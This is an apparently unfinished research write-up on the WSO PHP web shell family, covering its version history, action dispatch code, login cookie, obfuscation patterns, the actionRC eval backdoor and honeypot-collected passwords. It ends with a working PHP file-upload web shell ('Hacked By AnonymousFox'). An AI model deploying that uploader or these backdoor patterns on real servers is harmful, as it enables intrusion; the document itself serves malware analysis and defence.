# WSO Web Shells in depth

"Web shell" - what is it for?

If they were standalone, they'd be "remote access trojans",
or if legitimately installed, they'd be "remote support software",
like [Dameware](https://www.dameware.com/).

https://www.wordfence.com/blog/2017/06/wso-shell/
https://forum.antichat.ru/threads/103155/

A family of programs, modified in the wild by many programmers.

![WSO phylogeny](wso_phylogeny.png?raw=true)

## Origin

![oRb's avatar](orb_avatar.jpg?raw=true)
![oRb's antichat avatar](avatar_m.png?raw=true)

Announcements

* https://forum.antichat.ru/threads/103155/
* http://xaker.name/arhiv/threads/20827/

## Timeline

1. 
2. 

###

2.0 - 2.5 orderly development by oRb (?)

### Feature and bug fix progression

I know the most primitive versions as "WSO_VERSION" of 2.0,
I can't find a 1.x version.

### WSO 2.1

oRb says this is what WSO 2.1 featured:

* Authorization
* Info about the server
* File manager (Copy, rename, move, delete, mod, touch, create files and folders)
* View, hexview, editing, longload, file upload
* Console
* SQL manager (MySql, PostgreSql)
* PHP code execution
* Safe mode bypass
* Work with strings + hash search in online databases
* Bruteforce (FTP, MySql, PostgreSQL)
* Bindports and back-connections in C and Perl
* Self removal
* Works under Unix and Windows

That's certainly true,
but the big new feature is the "bindports and back-connections".

Relative to 2.0, 2.1 includes a lot of calls to `printHeader` and `printFooter`,
so cleaning up the user interface as well.

### WSO 2.2

The new feature in 2.2 is `function actionRC`, discussed in full [below](#actionRC).

oRb added more calls to `printHeader` and `printFooter`,
and cleaned up a few bugs, like deleting an extra `break;` in a switch-construct.
Another telling bug fix: 2.1 used Windows "drive letters" A through Z.
With 2.2, WSO uses drive letters C through Z.

### WSO 2.3

### WSO 2.4

### WSO 2.5 

### 4.x HardLinux variants

Started with WSO 2.3, (how do we know this?)
worked from there,
development hosted by github.
Russian-language developers.

## Design

WSO is a PHP program.
It executes on a HTTP server, in the context of some daemon process.
It takes actions on the server because WSO is a "shell",
or maybe a "remote access trojan",
generates HTML appropriate for those actions,
then sends the HTML back for a browser to display.
Virtually all PHP programs do something like this.

It uses the `_POST` superglobal variable rather than `_REQUEST`
Effort to be compatible with past versions of PHP,
old code,
or coder that never learned anything new?

HTML composed as PHP strings, output using `echo()` (?) instead of
interweaving blocks of PHP code with blocks of HTML.

### HTTP Parameters and action dispatch

| Name | Meaning |
|:------:|---------|
|   a    | Category of action |
| ajax   | |
|   c    | Current working directory |
|charset | character set to use in display |
|  pass    | authentication password |
|  p1    | action's parameter 1 |
|  p2    | action's parameter 2 |
|  p3    | action's parameter 3 |

The parameter named "a" is the most important:
it gets used to pick an "action",
which gets called via PHP's `call_user_func()` builtin.
I'd argue that the "a" parameter, action functions,
and `call_user_func()` action dispatch are what makes a
WSO webshell.
This is a unique, distinctive feature of all WSO variants.

    if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) {
        call_user_func('action' . $_POST['a']);
    }

Which actions use c/p1/p2/p3?

I suspect that between `call_user_func()`,
the modularity provided by the action functions,
and keeping HTML in PHP strings (rather than interleaved code and HTML),
the ease of modifying WSO has led to the explosion in variations.


### Login Cookie

| Cookie Name  | Cookie Value |
|--------------|--------------|
|`md5($_SERVER['HTTP_HOST'])`|`md5($password)`|


Invoking with parameter "pass" set cookie for later access.
`setcookie($k, $v);`

This feature allows attackers to invoke WSO instances with
either a POST parameter named "pass" and the correct value,
or with a cookie, no explicit login needed.
This often happens when attackers invoke `actionRC`,
"a=RC" POST parameter and value.

Is it worth mentioning the vigilante cookie?

### "action" functions

The value of the POST parameter named "a" determines a category
of things that WSO can do.
The functions available vary by version.



|WSO version |SecInfo             |Php|FilesMan|StringTools|FilesTools|SafeMode|Console|Logout|SelfRemove|Bruteforce|Sql|Network|RC|Domain|Framer|Infect|Mass|
|:------------|:------------------|:--------|:-------|:------|:------|:--------|:----------|:------|:------|:------|:----|:-------|:---|:---|:--------|:--------|:-------|
|2.0   |X|X|X|X|X|X|X|X|X|X|X| | | | | | |
|2.1   |X|X|X|X|X|X|X|X|X|X|X|X| | | | | |
|waw   |X|X|X|X|X|X|X|X|X|X|X|X| |X| |X| |
|wew   |X|X|X|X|X|X|X|X|X|X|X|X| | | | | |
|2.2   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|2.3   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|2.4   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|bogel |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|2.6   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|2.7   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|3.0   |X| |X|X|X|X|X| |X| |X|X|X|X| | |X|
|3.1   |X|X|X|X|X|X|X|X|X|X|X|X|X| |X| | |
|4.1.1 |X|X|X|X|X|X|X|X|X|X|X|X|X| | |X| |
|4.2.5 |X|X|X|X|X|X|X|X|X|X|X|X|X| | |X| |
|Jijle3|X|X|X|X|X|X|X|X|X|X|X|X|X|X| | | |
|Mystery%20Backdoor|X|X|X|X|X|X|X|X|X|X|X|X| | | | | |
|2.5   |X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|2.5.1 |X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|2.8   |X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|2.9   |X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|WEBAPP|X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|f4    | |X| | | | | |X|X| |X|X|X| | | | |
|ws_ver2|X|X|X| |X| | | | | | | |X| | | | |

"bogel" is just WSO 2.4 with the string "bogel" substituted
for any string matching `[Ww][Ss][Oo]`.
Several other string-substituted variants occur.

The Russian 4.x variants descend from 2.4 -
they use a PHP session to keep state rather than keeping state in a cookie.
Why did phylogeny indicate a 2.3 origin?

WSO 2.5.1 is WSO 2.5 with a "phone home" borrowed from fx29
web shells. WSO 2.8 is 2.5.1 with an additional "phone home",
the previous phone home is preserved.

### Conserved Features

Since WSO undergoes "evolution" in the wild,
it might be worth looking at what features get conserved.

"a" and `call_user_func`.

Perl in shell and back connect shell

## Methods of obfuscation

Can't be exhaustive - too numerous to list them all.

* FOPO
* mod_tumblr "plugin"
* eval(gzinflate(base64_decode($something)));

## Common URLs? Is this worth it?

### actionRC

Most of the "action" functions are devoted to interactive
use by humans.
One exception is the `actionRC` function,
which first appeared in WSO 2.2,
and is mostly conserved during subsequent evolution.
A few later variants have `function actionRC` edited out.

* Called 2 ways: with and without value for parameter "p1"
* Acts as an immediate eval backdoor if parameter named "p1"
is present and contains PHP source code.
* Returns a summary of system information if parameter "p1"
is not present.

In the wild,
attackers invoke WSO shells with HTTP parameter `a=RC`
both with and without PHP code as the value of the parameter named "p1".
It appears that invoking `actionRC` without "p1" contents
is a convenient way to verify that a WSO URL allows the password or cookie the attacker has,
and that Apache web server and PHP are correctly installed and work.

Attackers apparently invoke WSO with parameters `a=RC` and PHP code as the value of "p1"
to use WSO as an immediate eval backdoor.
My WSO emulator often catches this use.
A few examples:

* [Extendable back door](/backdoors/cscript)
* [Vigilante malware cleaner](/vigilante_suspected)
* [WSO download](/webshells/customizer-ui-experimenks.php)
* [Backdoor installation](/backdoors/campaignE)
* [Code-in-cookie back door](/backdoors/212.54.205.145-2018-01-25a)

./webshells/customizer-ui-experimenks.php/files/18.222.103.133Wq10A-rqgr4qxesssTQs0AAAAAc.wso.scans
has `a=RC`, and `p1=echo '67436';`.
This may be an attempt to validate that the URL so invoked constitutes
a real WSO instance, and not an emulator.
The attackers could vary the string echoed on every invocation.
It would be next to impossible to anticipate all the variations with emulator code.
This implies that a lot of WSO honey pots or emulators exist,
and constitute enough of a problem that the attackers would check for emulation.

Why use "Php" or "Console" actions for this, which does happen.

### actionPhp, actionConsole

### actionNetwork

`function actionNetwork` first appears in version 2.1

Perl and C source code for "bind shells" and shell servers,
all source kept in base64-encoded strings,
C compiled and executed on demand.
C shell and bind shell eliminated in version 2.3

## Vigilante Malware Remover

	-- vigilance committe cookie

## Invocations

I wrote my WordPress honey pot to include a WSO emulator.
That WSO emulator stores the passwords and login cookies of all the WSO login attempts.
I have written an [analysis of WSO passwords](passwords).

* [All passwords](passwords/wso.passwords.txt)
* [MD5 hashes and passwords](passwords/md5passwords.txt)
* [Top 20 passwords](passwords/top10.txt)

"root" appears to be the single most used passwords,
but I believe there are trends over time,
and possibly even vendors of access to WSO instances
who use the same password for all of their shells.

<?php
echo "Hacked By AnonymousFox\n";
{
$saw1 = $_FILES['file']['tmp_name'];
$saw2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='upload shell' />
</form>";
move_uploaded_file($saw1,$saw2);
}
?>
